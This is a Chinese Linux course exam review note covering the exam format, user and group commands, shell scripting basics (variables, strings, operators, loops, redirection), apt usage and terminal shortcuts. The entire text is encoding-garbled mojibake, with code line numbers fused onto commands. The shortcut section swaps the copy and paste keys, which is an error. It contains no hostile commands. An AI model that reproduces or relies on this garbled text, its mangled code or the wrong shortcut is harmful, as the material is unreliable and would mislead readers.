åŸºäºå‘½ä»¤çš„æ–‡å­—å¤„ç†ï¼Œå°¤å…¶æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼› Linuxä¸‹çš„Cè¯­è¨€ç¼–ç¨‹ç¯å¢ƒï¼ŒgccåŠmakeç­‰ï¼› Linuxä¸‹å¦‚ä½•æ­å»ºç½‘ç«™ï¼› Linuxä¸‹å¸¸ç”¨å‘½ä»¤çš„å®ç°ls, cat, cpä»¥åŠpwdç­‰ï¼› è¿›ç¨‹åŠçº¿ç¨‹ç­‰ï¼› è€ƒè¯•é¢˜å‹ å¡«ç©ºé¢˜ï¼ˆ30åˆ†ï¼š2åˆ†*15ï¼‰ï¼› åˆ¤æ–­é¢˜(10åˆ†ï¼š1åˆ†*10ï¼‰ï¼› ç®€ç­”é¢˜ï¼ˆ28åˆ†ï¼š4åˆ†*7ï¼‰ï¼› ä»£ç é˜…è¯»é¢˜ï¼ˆ16åˆ†ï¼‰ï¼›å¡«å†™ç©ºç™½ä»£ç è¡Œï¼› ç¼–ç¨‹é¢˜ï¼ˆ16åˆ†ï¼š8åˆ†*2ï¼‰ï¼› è€ƒè¯•èŒƒå›´å’Œé‡ç‚¹ æ¯å‘¨å®éªŒçš„å†…å®¹ï¼› ä¸è€ƒçš„å†…å®¹ï¼š1ã€æ­£åˆ™è¡¨è¾¾å¼ï¼›2ã€å­—ç¬¦ä¸²å¤„ç†å‘½ä»¤sedå’Œawkï¼›3ã€curlå’Œwgetï¼›4ã€SambaæœåŠ¡å™¨ã€apacheã€mysqlå’Œphpç­‰çš„å®‰è£…ï¼›5ã€å¤šçº¿ç¨‹çš„çº¿ç¨‹é—´åŒæ­¥ï¼› é‡ç‚¹è€ƒå¯Ÿå†…å®¹ Ubuntuä¸‹çš„å¸¸è§æ“ä½œï¼Œæ¯”å¦‚å®‰è£…ç¨‹åºï¼Œå¿«æ·é”®ç­‰ï¼› å¸¸ç”¨çš„å‘½ä»¤å’Œshellè„šæœ¬ï¼› Linuxä¸‹çš„ç¼–è¯‘ç¯å¢ƒï¼Œæ¯”å¦‚gccå’ŒMakefileï¼› å¸¸ç”¨shellå‘½ä»¤çš„Cè¯­è¨€å®ç°ï¼Œæ¯”å¦‚cp, cat, lsä»¥åŠpwdï¼› å¤šçº¿ç¨‹ä¸è¿›ç¨‹çš„åŸºæœ¬æ¦‚å¿µåŠæ¥å£ï¼› Linuxä¸‹çš„å„ç§å‘½ä»¤å‚è€ƒword(ä¹¦æœ¬å’Œwordç‰ˆæœ¬çš„linuxå¤ä¹ æçº²)ï¼Œé‡ç‚¹æ³¨æ„(è½¯é“¾æ¥ï¼Œç¡¬é“¾æ¥)ï¼Œï¼ˆrmï¼Œtailï¼Œheadï¼Œcatï¼Œgrepï¼Œcdï¼Œlsï¼Œmkdirã€‚rmdirï¼Œpwdï¼Œpsï¼Œâ€¦â€¦ï¼‰ï¼Œ(å‘½ä»¤ä¹‹é—´çš„ç®¡é“çš„åº”ç”¨)ï¼Œ(chmod)ï¼Œ(è¿›å…¥root)ï¼Œï¼ˆgroupç”¨æˆ·ç»„ï¼‰ï¼Œmanå‘½ä»¤ï¼Œcrontabå‘½ä»¤!!!ã€‚ 1. åˆ‡æ¢ç”¨æˆ·12su usernamesu #åˆ‡æ¢åˆ°rootç›®å½• 2.Group12groupadd é€‰é¡¹ ç”¨æˆ·ç»„groupdel ç”¨æˆ·ç»„ # åˆ é™¤ å¯ä»¥ä½¿ç”¨çš„é€‰é¡¹æœ‰ï¼š -g GID æŒ‡å®šæ–°ç”¨æˆ·ç»„çš„ç»„æ ‡è¯†å·ï¼ˆGIDï¼‰ã€‚ -o ä¸€èˆ¬ä¸-gé€‰é¡¹åŒæ—¶ä½¿ç”¨ï¼Œè¡¨ç¤ºæ–°ç”¨æˆ·ç»„çš„GIDå¯ä»¥ä¸ç³»ç»Ÿå·²æœ‰ç”¨æˆ·ç»„çš„GIDç›¸åŒã€‚ 12useradd é€‰é¡¹ ç”¨æˆ·å # æ–°å¢userdel é€‰é¡¹ ç”¨æˆ·å # åˆ é™¤ é€‰é¡¹: -c comment æŒ‡å®šä¸€æ®µæ³¨é‡Šæ€§æè¿°ã€‚ -d ç›®å½• æŒ‡å®šç”¨æˆ·ä¸»ç›®å½•ï¼Œå¦‚æœæ­¤ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™åŒæ—¶ä½¿ç”¨-mé€‰é¡¹ï¼Œå¯ä»¥åˆ›å»ºä¸»ç›®å½•ã€‚ -g ç”¨æˆ·ç»„ æŒ‡å®šç”¨æˆ·æ‰€å±çš„ç”¨æˆ·ç»„ã€‚ -G ç”¨æˆ·ç»„ï¼Œç”¨æˆ·ç»„ æŒ‡å®šç”¨æˆ·æ‰€å±çš„é™„åŠ ç»„ã€‚ -s Shellæ–‡ä»¶ æŒ‡å®šç”¨æˆ·çš„ç™»å½•Shellã€‚ -u ç”¨æˆ·å· æŒ‡å®šç”¨æˆ·çš„ç”¨æˆ·å·ï¼Œå¦‚æœåŒæ—¶æœ‰-oé€‰é¡¹ï¼Œåˆ™å¯ä»¥é‡å¤ä½¿ç”¨å…¶ä»–ç”¨æˆ·çš„æ ‡è¯†å·ã€‚ Shellè„šæœ¬ä¸‹é¢çš„å¤§éƒ¨åˆ†å†…å®¹å¼•ç”¨è‡ªshellèœé¸Ÿæ•™ç¨‹ï¼Œå¾ˆå¤šçš„å†…å®¹éƒ½çœç•¥äº†ï¼Œæƒ³çœ‹å®Œå…¨ç‰ˆçš„å»èœé¸Ÿæ•™ç¨‹ï¼Œè¿™é‡Œåªæ˜¯è€ƒè¯•å†…å®¹ã€‚ 1.shellè„šæœ¬åŸºç¡€bashï¼Œzshï¼Œcsh â€¦â€¦ï¼Œubuntuå†…ç½®çš„é»˜è®¤shellè„šæœ¬æ˜¯bashã€‚ 12#! /bin/bashecho &quot;Hello World !&quot; #! æ˜¯ä¸€ä¸ªçº¦å®šçš„æ ‡è®°ï¼Œå®ƒå‘Šè¯‰ç³»ç»Ÿè¿™ä¸ªè„šæœ¬éœ€è¦ä»€ä¹ˆè§£é‡Šå™¨æ¥æ‰§è¡Œï¼Œå³ä½¿ç”¨å“ªä¸€ç§ Shellã€‚ 2.shellè„šæœ¬çš„è¿è¡Œæ–¹å¼ 1ã€ä½œä¸ºå¯æ‰§è¡Œç¨‹åº cd åˆ°ç›¸åº”ç›®å½• 12chmod +x ./test.sh #ä½¿è„šæœ¬å…·æœ‰æ‰§è¡Œæƒé™./test.sh #æ‰§è¡Œè„šæœ¬ ä¸€å®šè¦å†™æˆ ./test.shï¼Œè€Œä¸æ˜¯ test.shï¼Œè¿è¡Œå…¶å®ƒäºŒè¿›åˆ¶çš„ç¨‹åºä¹Ÿä¸€æ ·ï¼Œç›´æ¥å†™ test.shï¼Œlinux ç³»ç»Ÿä¼šå» PATH é‡Œå¯»æ‰¾æœ‰æ²¡æœ‰å« test.sh çš„ã€‚è¦ç”¨ ./test.sh å‘Šè¯‰ç³»ç»Ÿè¯´ï¼Œå°±åœ¨å½“å‰ç›®å½•æ‰¾ã€‚ 2ã€ä½œä¸ºè§£é‡Šå™¨å‚æ•° è¿™ç§è¿è¡Œæ–¹å¼æ˜¯ï¼Œç›´æ¥è¿è¡Œè§£é‡Šå™¨ï¼Œå…¶å‚æ•°å°±æ˜¯ shell è„šæœ¬çš„æ–‡ä»¶åï¼Œå¦‚ï¼š 12/bin/sh test.sh/bin/php test.php è¿™ç§æ–¹å¼è¿è¡Œçš„è„šæœ¬ï¼Œä¸éœ€è¦åœ¨ç¬¬ä¸€è¡ŒæŒ‡å®šè§£é‡Šå™¨ä¿¡æ¯ï¼Œå†™äº†ä¹Ÿæ²¡ç”¨ã€‚ 3.shellå˜é‡æ³¨æ„ï¼Œå˜é‡åå’Œç­‰å·ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ 123456your_name=&quot;Jason&quot;é™¤äº†æ˜¾å¼åœ°ç›´æ¥èµ‹å€¼ï¼Œè¿˜å¯ä»¥ç”¨è¯­å¥ç»™å˜é‡èµ‹å€¼,å¦‚ï¼š for file in `ls /etc` æˆ– for file in $(ls /etc)ä»¥ä¸Šè¯­å¥å°† /etc ä¸‹ç›®å½•çš„æ–‡ä»¶åå¾ªç¯å‡ºæ¥ã€‚ å·²å®šä¹‰çš„å˜é‡ï¼Œå¯ä»¥è¢«é‡æ–°å®šä¹‰ 1234your_name=&quot;tom&quot;echo $your_nameyour_name=&quot;alibaba&quot;echo $your_name è¿™æ ·å†™æ˜¯åˆæ³•çš„ï¼Œä½†æ³¨æ„ï¼Œç¬¬äºŒæ¬¡èµ‹å€¼çš„æ—¶å€™ä¸èƒ½å†™ $ your_name=&quot;alibaba&quot;ï¼Œä½¿ç”¨å˜é‡çš„æ—¶å€™æ‰åŠ ç¾å…ƒç¬¦ï¼ˆ$ï¼‰ã€‚ åªè¯»å˜é‡ 12myUrl=&quot;https://www.google.com&quot;readonly myUrl åˆ é™¤å˜é‡ 1unset variable_name å˜é‡ç±»å‹(åº”è¯¥ä¸ä¼šè€ƒ):hear_no_evil: 1) å±€éƒ¨å˜é‡ å±€éƒ¨å˜é‡åœ¨è„šæœ¬æˆ–å‘½ä»¤ä¸­å®šä¹‰ï¼Œä»…åœ¨å½“å‰shellå®ä¾‹ä¸­æœ‰æ•ˆï¼Œå…¶ä»–shellå¯åŠ¨çš„ç¨‹åºä¸èƒ½è®¿é—®å±€éƒ¨å˜é‡ã€‚ 2) ç¯å¢ƒå˜é‡ æ‰€æœ‰çš„ç¨‹åºï¼ŒåŒ…æ‹¬shellå¯åŠ¨çš„ç¨‹åºï¼Œéƒ½èƒ½è®¿é—®ç¯å¢ƒå˜é‡ï¼Œæœ‰äº›ç¨‹åºéœ€è¦ç¯å¢ƒå˜é‡æ¥ä¿è¯å…¶æ­£å¸¸è¿è¡Œã€‚å¿…è¦çš„æ—¶å€™shellè„šæœ¬ä¹Ÿå¯ä»¥å®šä¹‰ç¯å¢ƒå˜é‡ã€‚ 3) shellå˜é‡ shellå˜é‡æ˜¯ç”±shellç¨‹åºè®¾ç½®çš„ç‰¹æ®Šå˜é‡ã€‚shellå˜é‡ä¸­æœ‰ä¸€éƒ¨åˆ†æ˜¯ç¯å¢ƒå˜é‡ï¼Œæœ‰ä¸€éƒ¨åˆ†æ˜¯å±€éƒ¨å˜é‡ï¼Œè¿™äº›å˜é‡ä¿è¯äº†shellçš„æ­£å¸¸è¿è¡Œ 3.1 shellå­—ç¬¦ä¸²å­—ç¬¦ä¸²å¯ä»¥ç”¨å•å¼•å·ï¼Œä¹Ÿå¯ä»¥ç”¨åŒå¼•å·ï¼Œä¹Ÿå¯ä»¥ä¸ç”¨å¼•å·ã€‚ 1str='this is a string' å•å¼•å·å­—ç¬¦ä¸²çš„é™åˆ¶ 1.å•å¼•å·é‡Œçš„ä»»ä½•å­—ç¬¦éƒ½ä¼šåŸæ ·è¾“å‡ºï¼Œå•å¼•å·å­—ç¬¦ä¸²ä¸­çš„å˜é‡æ˜¯æ— æ•ˆçš„ï¼›2.å•å¼•å·å­—ä¸²ä¸­ä¸èƒ½å‡ºç°å•ç‹¬ä¸€ä¸ªçš„å•å¼•å·ï¼ˆå¯¹å•å¼•å·ä½¿ç”¨è½¬ä¹‰ç¬¦åä¹Ÿä¸è¡Œï¼‰ï¼Œä½†å¯æˆå¯¹å‡ºç°ï¼Œä½œä¸ºå­—ç¬¦ä¸²æ‹¼æ¥ä½¿ç”¨ã€‚ åŒå¼•å·çš„ä¼˜ç‚¹ åŒå¼•å·é‡Œå¯ä»¥æœ‰å˜é‡ åŒå¼•å·é‡Œå¯ä»¥å‡ºç°è½¬ä¹‰å­—ç¬¦ æ‹¼æ¥å­—ç¬¦ä¸² 123456789your_name=&quot;runoob&quot;# ä½¿ç”¨åŒå¼•å·æ‹¼æ¥greeting=&quot;hello, &quot;$your_name&quot; !&quot;greeting_1=&quot;hello, ${your_name} !&quot;echo $greeting $greeting_1# ä½¿ç”¨å•å¼•å·æ‹¼æ¥greeting_2='hello, '$your_name' !'greeting_3='hello, ${your_name} !'echo $greeting_2 $greeting_3 è¾“å‡ºç»“æœä¸º 12hello, runoob ! hello, runoob !hello, runoob ! hello, ${your_name} ! å­—ç¬¦ä¸²é•¿åº¦ 12string=&quot;abcd&quot;echo ${#string} #è¾“å‡º 4 æŸ¥æ‰¾å­å­—ç¬¦ä¸² æŸ¥æ‰¾å­—ç¬¦ i æˆ– o çš„ä½ç½®(å“ªä¸ªå­—æ¯å…ˆå‡ºç°å°±è®¡ç®—å“ªä¸ª)ï¼š 12string=&quot;runoob is a great site&quot;echo `expr index &quot;$string&quot; io` # è¾“å‡º 4 æ³¨æ„ï¼š ä»¥ä¸Šè„šæœ¬ä¸­ `æ˜¯åå¼•å·ï¼Œè€Œä¸æ˜¯å•å¼•å·'ï¼Œä¸è¦çœ‹é”™äº†å“¦ã€‚ 3.2 shell æ•°ç»„1234567891011æ•°ç»„å=(å€¼1 å€¼2 ... å€¼n)array_name=(value0 value1 value2 value3)array_name=(value0value1value2value3)array_name[0]=value0array_name[1]=value1array_name[n]=valuen 3.3 shell æ³¨é‡Šä»¥ # å¼€å¤´çš„è¡Œå°±æ˜¯æ³¨é‡Šï¼Œä¼šè¢«è§£é‡Šå™¨å¿½ç•¥ã€‚ å¤šè¡Œæ³¨é‡Š 12345:&lt;&lt;EOFæ³¨é‡Šå†…å®¹...æ³¨é‡Šå†…å®¹...æ³¨é‡Šå†…å®¹...EOF 4.shellä¼ é€’å‚æ•°æˆ‘ä»¬å¯ä»¥åœ¨æ‰§è¡Œ Shell è„šæœ¬æ—¶ï¼Œå‘è„šæœ¬ä¼ é€’å‚æ•°ï¼Œè„šæœ¬å†…è·å–å‚æ•°çš„æ ¼å¼ä¸ºï¼š$nã€‚n ä»£è¡¨ä¸€ä¸ªæ•°å­—ï¼Œ1 ä¸ºæ‰§è¡Œè„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ2 ä¸ºæ‰§è¡Œè„šæœ¬çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨â€¦â€¦ ä¾‹å¦‚ï¼š 12345echo &quot;Shell ä¼ é€’å‚æ•°å®ä¾‹ï¼&quot;;echo &quot;æ‰§è¡Œçš„æ–‡ä»¶åï¼š$0&quot;;echo &quot;ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºï¼š$1&quot;;echo &quot;ç¬¬äºŒä¸ªå‚æ•°ä¸ºï¼š$2&quot;;echo &quot;ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºï¼š$3&quot;; è¾“å‡ºå¦‚ä¸‹: 1234567$ chmod +x test.sh $ ./test.sh 1 2 3Shell ä¼ é€’å‚æ•°å®ä¾‹ï¼æ‰§è¡Œçš„æ–‡ä»¶åï¼š./test.shç¬¬ä¸€ä¸ªå‚æ•°ä¸ºï¼š1ç¬¬äºŒä¸ªå‚æ•°ä¸ºï¼š2ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºï¼š3 ç‰¹æ®Šå‚æ•°ï¼š å‚æ•°å¤„ç† è¯´æ˜ $# ä¼ é€’åˆ°è„šæœ¬çš„å‚æ•°ä¸ªæ•° $? æ˜¾ç¤ºæœ€åå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ã€‚0è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œå…¶ä»–ä»»ä½•å€¼è¡¨æ˜æœ‰é”™è¯¯ã€‚ $* ä»¥ä¸€ä¸ªå•å­—ç¬¦ä¸²æ˜¾ç¤ºæ‰€æœ‰å‘è„šæœ¬ä¼ é€’çš„å‚æ•°ã€‚å¦‚â€$*â€ç”¨ã€Œâ€ã€æ‹¬èµ·æ¥çš„æƒ…å†µã€ä»¥â€$1 $2 â€¦ $nâ€çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚ 5.shellåŸºæœ¬è¿ç®—ç¬¦12val=`expr 2 + 2`echo &quot;ä¸¤æ•°ä¹‹å’Œä¸º : $val&quot; è¡¨è¾¾å¼å’Œè¿ç®—ç¬¦ä¹‹é—´è¦æœ‰ç©ºæ ¼ï¼Œä¾‹å¦‚ 2+2 æ˜¯ä¸å¯¹çš„ï¼Œå¿…é¡»å†™æˆ 2 + 2ï¼Œè¿™ä¸æˆ‘ä»¬ç†Ÿæ‚‰çš„å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸ä¸€æ ·ã€‚ è¿ç®—ç¬¦ è¯´æ˜ ä¸¾ä¾‹ + åŠ æ³• expr $a + $b ç»“æœä¸º 30ã€‚ - å‡æ³• expr $a - $b ç»“æœä¸º -10ã€‚ * ä¹˜æ³• expr $a \\* $b ç»“æœä¸º 200ã€‚ / é™¤æ³• expr $b / $a ç»“æœä¸º 2ã€‚ % å–ä½™ expr $b % $a ç»“æœä¸º 0ã€‚ = èµ‹å€¼ a=$b å°†æŠŠå˜é‡ b çš„å€¼èµ‹ç»™ aã€‚ == ç›¸ç­‰ã€‚ç”¨äºæ¯”è¾ƒä¸¤ä¸ªæ•°å­—ï¼Œç›¸åŒåˆ™è¿”å› trueã€‚ [ $a == $b ] è¿”å› falseã€‚ != ä¸ç›¸ç­‰ã€‚ç”¨äºæ¯”è¾ƒä¸¤ä¸ªæ•°å­—ï¼Œä¸ç›¸åŒåˆ™è¿”å› trueã€‚ [ $a != $b ] è¿”å› trueã€‚ æ³¨æ„ï¼šæ¡ä»¶è¡¨è¾¾å¼è¦æ”¾åœ¨æ–¹æ‹¬å·ä¹‹é—´ï¼Œå¹¶ä¸”è¦æœ‰ç©ºæ ¼ï¼Œä¾‹å¦‚: [$a==$b] æ˜¯é”™è¯¯çš„ï¼Œå¿…é¡»å†™æˆ **[ $a == $b ]**ã€‚ ä¹˜å·(*)å‰è¾¹å¿…é¡»åŠ åæ–œæ ()æ‰èƒ½å®ç°ä¹˜æ³•è¿ç®— æ•°å­—ç±»å‹å…³ç³»è¿ç®—ç¬¦ è¿ç®—ç¬¦ è¯´æ˜ ä¸¾ä¾‹ -eq æ£€æµ‹ä¸¤ä¸ªæ•°æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å› trueã€‚ [ $a -eq $b ] è¿”å› falseã€‚ -ne æ£€æµ‹ä¸¤ä¸ªæ•°æ˜¯å¦ä¸ç›¸ç­‰ï¼Œä¸ç›¸ç­‰è¿”å› trueã€‚ [ $a -ne $b ] è¿”å› trueã€‚ -gt æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å¤§äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚ [ $a -gt $b ] è¿”å› falseã€‚ -lt æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å°äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚ [ $a -lt $b ] è¿”å› trueã€‚ -ge æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å¤§äºç­‰äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚ [ $a -ge $b ] è¿”å› falseã€‚ -le æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å°äºç­‰äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚ [ $a -le $b ] è¿”å› trueã€‚ å¸ƒå°”è¿ç®—ç¬¦ è¿ç®—ç¬¦ è¯´æ˜ ä¸¾ä¾‹ ! éè¿ç®—ï¼Œè¡¨è¾¾å¼ä¸º true åˆ™è¿”å› falseï¼Œå¦åˆ™è¿”å› trueã€‚ [ ! false ] è¿”å› trueã€‚ -o æˆ–è¿ç®—ï¼Œæœ‰ä¸€ä¸ªè¡¨è¾¾å¼ä¸º true åˆ™è¿”å› trueã€‚ [ $a -lt 20 -o $b -gt 100 ] è¿”å› trueã€‚ -a ä¸è¿ç®—ï¼Œä¸¤ä¸ªè¡¨è¾¾å¼éƒ½ä¸º true æ‰è¿”å› trueã€‚ [ $a -lt 20 -a $b -gt 100 ] è¿”å› falseã€‚ å­—ç¬¦ä¸²è¿ç®—ç¬¦ è¿ç®—ç¬¦ è¯´æ˜ ä¸¾ä¾‹ = æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å› trueã€‚ [ $a = $b ] è¿”å› falseã€‚ != æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ç›¸ç­‰ï¼Œä¸ç›¸ç­‰è¿”å› trueã€‚ [ $a != $b ] è¿”å› trueã€‚ -z æ£€æµ‹å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º0ï¼Œä¸º0è¿”å› trueã€‚ [ -z $a ] è¿”å› falseã€‚ -n æ£€æµ‹å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸ä¸º 0ï¼Œä¸ä¸º 0 è¿”å› trueã€‚ [ -n â€œ$aâ€ ] è¿”å› trueã€‚ $ æ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºè¿”å› trueã€‚ [ $a ] è¿”å› trueã€‚ 6.Shell echoå‘½ä»¤123#!/bin/shread name echo &quot;$name It is a test&quot; é‡å®šå‘ 1echo &quot;It is a test&quot; &gt; myfile æ˜¾ç¤ºå‘½ä»¤æ‰§è¡Œç»“æœ 1echo `date` 7.Shell printf1printf format-string [arguments...] 1234printf &quot;%-10s %-8s %-4s\\n&quot; å§“å æ€§åˆ« ä½“é‡kg printf &quot;%-10s %-8s %-4.2f\\n&quot; éƒ­é– ç”· 66.1234printf &quot;%-10s %-8s %-4.2f\\n&quot; æ¨è¿‡ ç”· 48.6543printf &quot;%-10s %-8s %-4.2f\\n&quot; éƒ­èŠ™ å¥³ 47.9876 è½¬ä¹‰ åºåˆ— è¯´æ˜ \\a è­¦å‘Šå­—ç¬¦ï¼Œé€šå¸¸ä¸ºASCIIçš„BELå­—ç¬¦ \\b åé€€ \\c æŠ‘åˆ¶ï¼ˆä¸æ˜¾ç¤ºï¼‰è¾“å‡ºç»“æœä¸­ä»»ä½•ç»“å°¾çš„æ¢è¡Œå­—ç¬¦ï¼ˆåªåœ¨%bæ ¼å¼æŒ‡ç¤ºç¬¦æ§åˆ¶ä¸‹çš„å‚æ•°å­—ç¬¦ä¸²ä¸­æœ‰æ•ˆï¼‰ï¼Œè€Œä¸”ï¼Œä»»ä½•ç•™åœ¨å‚æ•°é‡Œçš„å­—ç¬¦ã€ä»»ä½•æ¥ä¸‹æ¥çš„å‚æ•°ä»¥åŠä»»ä½•ç•™åœ¨æ ¼å¼å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼Œéƒ½è¢«å¿½ç•¥ \\f æ¢é¡µï¼ˆformfeedï¼‰ \\n æ¢è¡Œ \\r å›è½¦ï¼ˆCarriage returnï¼‰ \\t æ°´å¹³åˆ¶è¡¨ç¬¦ \\v å‚ç›´åˆ¶è¡¨ç¬¦ \\ ä¸€ä¸ªå­—é¢ä¸Šçš„åæ–œæ å­—ç¬¦ \\ddd è¡¨ç¤º1åˆ°3ä½æ•°å…«è¿›åˆ¶å€¼çš„å­—ç¬¦ã€‚ä»…åœ¨æ ¼å¼å­—ç¬¦ä¸²ä¸­æœ‰æ•ˆ \\0ddd è¡¨ç¤º1åˆ°3ä½çš„å…«è¿›åˆ¶å€¼å­—ç¬¦ 8.æµç¨‹æ§åˆ¶(ä¹¦ä¸Šå†™çš„å¤Ÿæ˜ç™½äº†)1234567891011121314a=10b=20if [ $a == $b ]then echo &quot;a ç­‰äº b&quot;elif [ $a -gt $b ]then echo &quot;a å¤§äº b&quot;elif [ $a -lt $b ]then echo &quot;a å°äº b&quot;else echo &quot;æ²¡æœ‰ç¬¦åˆçš„æ¡ä»¶&quot;fi 12345678910for loop in 1 2 3 4 5do echo &quot;The value is: $loop&quot;donefor str in This is a stringdo echo $strdone 12345678910111213int=1while(( $int&lt;=5 ))do echo $int let &quot;int++&quot;doneecho 'æŒ‰ä¸‹ &lt;CTRL-D&gt; é€€å‡º'echo -n 'è¾“å…¥ä½ æœ€å–œæ¬¢çš„ç½‘ç«™å: 'while read FILMdo echo &quot;æ˜¯çš„ï¼$FILM æ˜¯ä¸€ä¸ªå¥½ç½‘ç«™&quot;done 1234567a=0until [ ! $a -lt 10 ]do echo $a a=`expr $a + 1`done 123456789101112131415161718192021222324252627echo 'è¾“å…¥ 1 åˆ° 4 ä¹‹é—´çš„æ•°å­—:'echo 'ä½ è¾“å…¥çš„æ•°å­—ä¸º:'read aNumcase $aNum in 1) echo 'ä½ é€‰æ‹©äº† 1' ;; 2) echo 'ä½ é€‰æ‹©äº† 2' ;; 3) echo 'ä½ é€‰æ‹©äº† 3' ;; 4) echo 'ä½ é€‰æ‹©äº† 4' ;; *) echo 'ä½ æ²¡æœ‰è¾“å…¥ 1 åˆ° 4 ä¹‹é—´çš„æ•°å­—' ;;esac#-----------------------------------------site=&quot;runoob&quot;case &quot;$site&quot; in &quot;runoob&quot;) echo &quot;èœé¸Ÿæ•™ç¨‹&quot; ;; &quot;google&quot;) echo &quot;Google æœç´¢&quot; ;; &quot;taobao&quot;) echo &quot;æ·˜å®ç½‘&quot; ;;esac 9.Shell è¾“å…¥/è¾“å‡ºé‡å®šå‘ å‘½ä»¤ è¯´æ˜ command &gt; file å°†è¾“å‡ºé‡å®šå‘åˆ° fileã€‚ command &lt; file å°†è¾“å…¥é‡å®šå‘åˆ° fileã€‚ command &gt;&gt; file å°†è¾“å‡ºä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘åˆ° fileã€‚ n &gt; file å°†æ–‡ä»¶æè¿°ç¬¦ä¸º n çš„æ–‡ä»¶é‡å®šå‘åˆ° fileã€‚ n &gt;&gt; file å°†æ–‡ä»¶æè¿°ç¬¦ä¸º n çš„æ–‡ä»¶ä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘åˆ° fileã€‚ n &gt;&amp; m å°†è¾“å‡ºæ–‡ä»¶ m å’Œ n åˆå¹¶ã€‚ n &lt;&amp; m å°†è¾“å…¥æ–‡ä»¶ m å’Œ n åˆå¹¶ã€‚ &lt;&lt; tag å°†å¼€å§‹æ ‡è®° tag å’Œç»“æŸæ ‡è®° tag ä¹‹é—´çš„å†…å®¹ä½œä¸ºè¾“å…¥ã€‚ å¦‚ä½•å®‰è£…åº”ç”¨ç¨‹åºï¼Œå¿«æ·é”®ç­‰1.æ¢æº12sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak å¤‡ä»½åŸæ¥çš„sorceæ–‡ä»¶sudo gedit /etc/apt/sources.list ä¿®æ”¹sources.listæ–‡ä»¶ or sudo vim /etc/apt/sources.list ä¿®æ”¹å®Œè¿™ä¸ªæ–‡ä»¶å 1sudo apt-get update 2.å®‰è£…è½¯ä»¶1sudo apt-get install [app] 3.ç§»é™¤è½¯ä»¶1sudo apt-get remove [app] 4.apt or apt-getaptä¸apt-getå¯ä»¥å®ç°å¤§éƒ¨åˆ†ç›¸åŒçš„åŠŸèƒ½ï¼Œå¯ä»¥è§†ä½œä¸¤ä¸ªä¸åŒçš„è½¯ä»¶ï¼Œä½†æ˜¯apt-getæ”¯æŒæ›´ä¸ºåº•å±‚çš„æ“ä½œï¼Œå…¶æ“ä½œæ›´ç»†ã€‚ 5.å¿«æ·é”®5.1 linux, terminalCtrl + Alt + Tæ‰“å¼€ç»ˆç«¯ã€‚ Tab-è‡ªåŠ¨è¡¥å…¨ å½“ä»¥xxxå¼€å¤´çš„å‘½ä»¤æˆ–æ–‡ä»¶åä»…æœ‰1ä¸ªæ—¶ï¼ŒæŒ‰ä¸‹Tabé”® 1æ¬¡ï¼Œå°†ä¼šè‡ªåŠ¨è¡¥å…¨è¯¥å‘½ä»¤æˆ–æ–‡ä»¶åï¼› å½“ä»¥xxxå¼€å¤´çš„å‘½ä»¤æˆ–æ–‡ä»¶åä¸æ­¢1ä¸ªæ—¶ï¼ŒæŒ‰1æ¬¡Tabé”®æ˜¯æ²¡ååº”çš„ï¼Œå†æŒ‰1æ¬¡Tabé”®ï¼Œä¸‹æ–¹å°†å‡ºç°ä»¥xxxå¼€å¤´çš„å‘½ä»¤æˆ–æ–‡ä»¶åã€‚ åœ¨ç»ˆç«¯&amp;æ§åˆ¶å°ä¸‹copy and pasteï¼š ç²˜è´´ï¼šCtrl + Shift + c æˆ– Ctrl + Insert å¤åˆ¶ï¼šCtrl + Shift + v æˆ– Shift + Insert åœ¨ç»ˆç«¯ä¸­æœç´¢å†…å®¹ Ctrl + Shift + f å‘½ä»¤è¡Œå†å² ä¸Šé”®ã€Ctrl + pï¼šæŸ¥çœ‹ä¸Šä¸€ä¸ªä½¿ç”¨è¿‡çš„å‘½ä»¤ ä¸‹é”®ã€Ctrl + nï¼šæŸ¥çœ‹ä¸‹ä¸€ä¸ªä½¿ç”¨è¿‡çš„å‘½ä»¤ Ctrl + rï¼šæœç´¢å†å²å‘½ä»¤ã€‚è¾“å…¥è‹¥å¹²å­—ç¬¦ï¼Œå¼€å§‹å‘ä¸Šæœç´¢åŒ…å«è¯¥å­—ç¬¦çš„å‘½ä»¤ï¼Œç»§ç»­æŒ‰Ctrl+rï¼Œæœç´¢ä¸Šä¸€æ¡åŒ¹é…çš„å‘½ä»¤ æ¸…å± Ctrl + l æ¨ªçº¿çš„æ•°é‡ 